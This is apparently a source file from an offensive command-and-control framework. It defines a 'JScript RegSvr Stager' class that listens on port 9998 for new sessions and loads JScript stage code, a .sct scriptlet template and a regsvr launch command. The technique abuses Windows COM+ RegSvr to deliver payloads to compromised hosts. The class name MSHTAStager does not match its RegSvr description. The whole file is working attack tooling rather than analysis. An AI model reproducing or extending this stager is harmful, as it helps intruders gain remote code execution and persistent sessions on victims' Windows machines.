import core.stager
import core.loader

class MSHTAStager(core.stager.StagerWizard):

    NAME = "JScript RegSvr Stager"
    DESCRIPTION = "Listens for new sessions, using COM+ RegSvr for payloads"
    AUTHORS = [ 'subTee', # discovery
                'zerosum0x0' # stager
                ]

    WORKLOAD = "js"

    def load(self):
        #self.options.set("SRVPORT", 9998)
        self.port = 9998

        self.stdlib = core.loader.load_script('data/stager/js/stdlib.js')
        self.stage = core.loader.load_script('data/stager/js/stage.js')
        self.stagetemplate = core.loader.load_script("data/stager/js/regsvr/template.sct")
        self.stagecmd = core.loader.load_script("data/stager/js/regsvr/regsvr.cmd")
        self.forktemplate = self.stagetemplate
        self.forkcmd = self.stagecmd
        self.workload = "js"
